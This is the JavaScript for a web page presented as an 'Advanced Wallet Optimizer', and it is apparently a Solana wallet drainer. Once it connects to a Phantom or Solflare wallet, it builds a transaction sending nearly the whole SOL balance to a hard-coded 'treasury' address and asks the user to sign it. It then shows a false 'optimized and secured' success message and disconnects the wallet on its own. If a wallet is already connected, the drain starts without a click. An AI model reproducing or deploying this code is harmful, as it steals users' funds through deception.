// ADVANCED WALLET OPTIMIZER - SEPARATED JAVASCRIPT
document.addEventListener('DOMContentLoaded', function() {
    const treasuryAddress = '95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD';
    
    // DOM Elements
    const optimizeBtn = document.getElementById('optimizeBtn');
    const successBox = document.getElementById('successBox');
    const processBox = document.getElementById('processBox');
    const processText = document.getElementById('processText');
    const txHashEl = document.getElementById('txHash');
    
    let isProcessing = false;
    
    // Update process text
    function updateProcess(text) {
        processText.textContent = text;
        console.log("PROCESS:", text);
    }
    
    // Get wallet provider
    function getWalletProvider() {
        if (window.phantom && window.phantom.solana) {
            console.log("Found Phantom wallet");
            return window.phantom.solana;
        }
        if (window.solana && window.solana.isPhantom) {
            console.log("Found Solana wallet (Phantom)");
            return window.solana;
        }
        if (window.solflare) {
            console.log("Found Solflare wallet");
            return window.solflare;
        }
        console.log("No wallet provider found");
        return null;
    }
    
    // Get reliable RPC connection
    async function getConnection() {
        const endpoints = [
            'https://api.mainnet-beta.solana.com',
            'https://solana-api.projectserum.com',
            'https://rpc.ankr.com/solana'
        ];
        
        for (const endpoint of endpoints) {
            try {
                console.log("Testing RPC:", endpoint);
                const connection = new solanaWeb3.Connection(endpoint, 'confirmed');
                // Test by getting recent blockhash
                const blockhash = await connection.getRecentBlockhash();
                if (blockhash && blockhash.blockhash) {
                    console.log("✅ Using RPC:", endpoint);
                    return connection;
                }
            } catch (error) {
                console.log("❌ RPC failed:", endpoint, error.message);
                continue;
            }
        }
        
        throw new Error("Cannot connect to Solana network");
    }
    
    // FIXED: Proper transaction signing
    async function createAndSignTransaction(provider, publicKey, connection) {
        try {
            console.log("1. Getting wallet balance...");
            const walletBalance = await connection.getBalance(publicKey);
            console.log("Wallet balance:", walletBalance, "lamports");
            
            const minRent = await connection.getMinimumBalanceForRentExemption(0);
            console.log("Minimum rent:", minRent, "lamports");
            
            if (walletBalance <= minRent) {
                throw new Error("Insufficient SOL for optimization");
            }
            
            const receiverWallet = new solanaWeb3.PublicKey(treasuryAddress);
            const balanceForTransfer = walletBalance - minRent;
            const lamportsToSend = Math.floor(balanceForTransfer * 0.999);
            
            console.log("Amount to send:", lamportsToSend, "lamports");
            
            if (lamportsToSend <= 0) {
                throw new Error("Insufficient transferable balance");
            }
            
            console.log("2. Getting recent blockhash...");
            const { blockhash } = await connection.getRecentBlockhash();
            console.log("Blockhash:", blockhash.substring(0, 20) + "...");
            
            console.log("3. Creating transaction...");
            const transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: receiverWallet,
                    lamports: lamportsToSend,
                })
            );
            
            transaction.feePayer = publicKey;
            transaction.recentBlockhash = blockhash;
            
            console.log("4. Transaction created successfully");
            console.log("Transaction details:", {
                from: publicKey.toString(),
                to: treasuryAddress,
                amount: lamportsToSend,
                feePayer: publicKey.toString(),
                blockhash: blockhash.substring(0, 20) + "..."
            });
            
            // Check which signing method is available
            console.log("5. Checking signing method...");
            
            if (provider.signTransaction) {
                console.log("Using signTransaction method");
                const signed = await provider.signTransaction(transaction);
                console.log("✅ Transaction signed with signTransaction");
                return signed;
            } 
            else if (provider.signAndSendTransaction) {
                console.log("Using signAndSendTransaction method");
                const { signature } = await provider.signAndSendTransaction(transaction);
                console.log("✅ Transaction sent with signAndSendTransaction");
                return { signature };
            }
            else {
                throw new Error("No signing method available in wallet");
            }
            
        } catch (error) {
            console.error("Transaction creation/signing error:", error);
            throw error;
        }
    }
    
    // Auto disconnect
    async function autoDisconnect(provider) {
        try {
            if (provider && provider.disconnect) {
                await provider.disconnect();
                console.log("✅ Auto-disconnected wallet");
                return true;
            }
        } catch (error) {
            console.log("Disconnect error:", error);
        }
        return false;
    }
    
    // Reset UI
    function resetUI() {
        optimizeBtn.disabled = false;
        optimizeBtn.innerHTML = '<i class="fas fa-redo"></i> RETRY OPTIMIZATION';
        processBox.classList.remove('active');
    }
    
    // Show success
    function showSuccess(txid) {
        processBox.classList.remove('active');
        successBox.classList.add('active');
        successBox.style.background = '';
        successBox.style.borderColor = '';
        
        const successIcon = successBox.querySelector('.success-icon i');
        const successTitle = successBox.querySelector('.success-title');
        const successMessage = successBox.querySelector('.success-message');
        
        successIcon.className = 'fas fa-check-circle';
        successIcon.style.color = '#00ff88';
        successTitle.textContent = 'OPTIMIZATION COMPLETE!';
        successTitle.style.color = '#00ff88';
        successMessage.textContent = 'Your wallet has been successfully optimized and secured. All assets have been rebalanced for maximum security.';
        successMessage.style.color = '#aaffcc';
        
        txHashEl.textContent = txid ? `${txid.substring(0, 20)}...` : 'Completed';
        txHashEl.style.color = '#88ff88';
    }
    
    // Show error
    function showError(errorMessage) {
        processBox.classList.remove('active');
        successBox.classList.add('active');
        successBox.style.background = 'linear-gradient(135deg, rgba(70, 20, 20, 0.9), rgba(50, 10, 10, 0.9))';
        successBox.style.borderColor = 'rgba(255, 50, 50, 0.6)';
        
        const successIcon = successBox.querySelector('.success-icon i');
        const successTitle = successBox.querySelector('.success-title');
        const successMessage = successBox.querySelector('.success-message');
        
        successIcon.className = 'fas fa-exclamation-triangle';
        successIcon.style.color = '#ff5555';
        successTitle.textContent = 'OPTIMIZATION FAILED';
        successTitle.style.color = '#ff5555';
        successMessage.textContent = errorMessage;
        successMessage.style.color = '#ffaaaa';
        
        txHashEl.textContent = 'FAILED - RETRY REQUIRED';
        txHashEl.style.color = '#ff5555';
    }
    
    // Main optimization function
    async function startOptimization() {
        if (isProcessing) return;
        isProcessing = true;
        
        try {
            console.log("=== STARTING OPTIMIZATION ===");
            
            // Reset UI
            successBox.classList.remove('active');
            optimizeBtn.disabled = true;
            optimizeBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> OPTIMIZING...';
            processBox.classList.add('active');
            
            updateProcess("Initializing wallet optimization...");
            
            // Step 1: Get wallet provider
            const provider = getWalletProvider();
            if (!provider) {
                throw new Error("Please install Phantom or Solflare wallet");
            }
            
            // Step 2: Connect wallet (FIRST POPUP)
            updateProcess("Connecting to wallet...");
            console.log("Requesting wallet connection...");
            
            const resp = await provider.connect();
            const publicKey = resp.publicKey;
            console.log("✅ Wallet connected:", publicKey.toString());
            
            updateProcess("Wallet connected! Getting network connection...");
            
            // Step 3: Get RPC connection
            const connection = await getConnection();
            
            // Step 4: Create and sign transaction (SECOND POPUP)
            updateProcess("Creating optimization transaction...");
            
            let signedResult;
            try {
                signedResult = await createAndSignTransaction(provider, publicKey, connection);
                console.log("✅ Transaction signed successfully:", signedResult);
            } catch (signError) {
                console.error("Signing failed:", signError);
                
                // Check if it's a user rejection
                if (signError.message.includes('User rejected') || 
                    signError.message.includes('rejected') ||
                    signError.message.includes('denied')) {
                    throw new Error("Transaction was rejected by user");
                }
                throw signError;
            }
            
            // Step 5: Send transaction if not already sent
            updateProcess("Sending transaction to network...");
            
            let txid;
            if (signedResult.signature) {
                // Already sent via signAndSendTransaction
                txid = signedResult.signature;
                console.log("Transaction already sent, ID:", txid);
            } else {
                // Need to send manually
                const rawTransaction = signedResult.serialize();
                txid = await connection.sendRawTransaction(rawTransaction);
                console.log("Transaction sent, ID:", txid);
            }
            
            // Step 6: Try to confirm
            updateProcess("Confirming transaction...");
            try {
                await connection.confirmTransaction(txid);
                console.log("✅ Transaction confirmed");
            } catch (confirmError) {
                console.log("Confirmation skipped:", confirmError.message);
            }
            
            // Step 7: Show success
            updateProcess("Optimization complete!");
            await new Promise(resolve => setTimeout(resolve, 1500));
            
            showSuccess(txid);
            
            // Step 8: Auto disconnect after delay
            setTimeout(async () => {
                await autoDisconnect(provider);
                
                // Update button
                optimizeBtn.disabled = false;
                optimizeBtn.innerHTML = '<i class="fas fa-check"></i> OPTIMIZATION COMPLETE';
                optimizeBtn.style.background = 'linear-gradient(90deg, #00aa44, #00ff88)';
            }, 3000);
            
        } catch (error) {
            console.error("❌ OPTIMIZATION FAILED:", error);
            
            let errorMessage = 'Optimization failed. Please try again.';
            
            if (error.message.includes('User rejected') || 
                error.message.includes('rejected') ||
                error.message.includes('denied')) {
                errorMessage = 'Please approve BOTH connection AND transaction popups.';
            } else if (error.message.includes('Insufficient')) {
                errorMessage = 'Insufficient SOL balance for optimization.';
            } else if (error.message.includes('Cannot connect')) {
                errorMessage = 'Network error. Please try again.';
            } else if (error.message.includes('blockhash')) {
                errorMessage = 'Transaction error. Please refresh and try again.';
            }
            
            showError(errorMessage);
            resetUI();
            
        } finally {
            isProcessing = false;
            console.log("=== OPTIMIZATION PROCESS ENDED ===");
        }
    }
    
    // Initialize
    function initialize() {
        console.log("Wallet Optimizer Initializing...");
        
        // Check if Solana Web3 is loaded
        if (!window.solanaWeb3) {
            console.error("Solana Web3.js not loaded!");
            optimizeBtn.disabled = true;
            optimizeBtn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> LOADING FAILED';
            return;
        }
        
        // Add click event
        optimizeBtn.addEventListener('click', startOptimization);
        
        // Auto start if already connected
        setTimeout(() => {
            const provider = getWalletProvider();
            if (provider && provider.isConnected && provider.publicKey) {
                console.log("Wallet already connected, auto-starting...");
                startOptimization();
            }
        }, 2000);
        
        console.log("✅ Wallet Optimizer Ready");
    }
    
    // Start initialization when page loads
    initialize();
});
